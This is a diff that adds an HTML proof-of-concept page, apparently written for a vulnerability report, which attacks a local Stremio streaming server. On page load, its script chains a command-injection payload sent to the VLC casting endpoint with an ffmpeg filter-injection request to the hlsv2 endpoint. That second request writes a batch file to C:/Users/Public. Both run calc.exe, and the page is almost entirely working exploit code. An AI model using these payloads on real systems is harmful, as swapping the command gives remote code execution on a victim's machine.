@@ -1,0 +1,32 @@
+<!doctype html>
+<head>
+  <meta charset="utf-8">
+  <title>Stremio proxy origin POC</title>
+</head>
+<body>
+  <p>This proxy hosts attacker-controlled html on localhost, allowing it to make local calls to the stremio server.</p>
+  <p>It uses two bugs: One RCE bug, which makes a post request to the casting url which allows commands to be ran, and one write bug, which makes a get request to hlsv2 that writes a log file to any folder with any filetype,</p>
+  <p>Upon opening this page, a file will be dropped that, once ran, opens calc.exe, and the rce will automcatically run calc.exe.</p>
+  
+  <script>
+  // POST's previously reported RCE
+  const command = "calc.exe"
+  const source = `http://random.url/video.mp4" --intf dummy --dummy-quiet --play-and-exit & start "" ${command} & rem "`;
+  fetch('/casting/vlc/player', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: new URLSearchParams({source})
+  });
+
+  // Write
+  const writePath = "C:/Users/Public/poc.bat"
+
+  const upstream = decodeURIComponent(location.pathname.split('/')[2] || '');
+  const mediaBase = upstream.slice(2);
+  const subtitle = `${mediaBase}/base.srt',metadata=mode=add:key='${command} & exit':value=value,metadata=mode=print:file='${writePath}`;
+  const query = new URLSearchParams({mediaURL: `${mediaBase}/base.mp4`,url: subtitle, forceTranscoding: '1'});
+
+  fetch(`/hlsv2/poc-${Date.now()}/burn?${query}`)
+  window.close();
+  </script>
+</body>
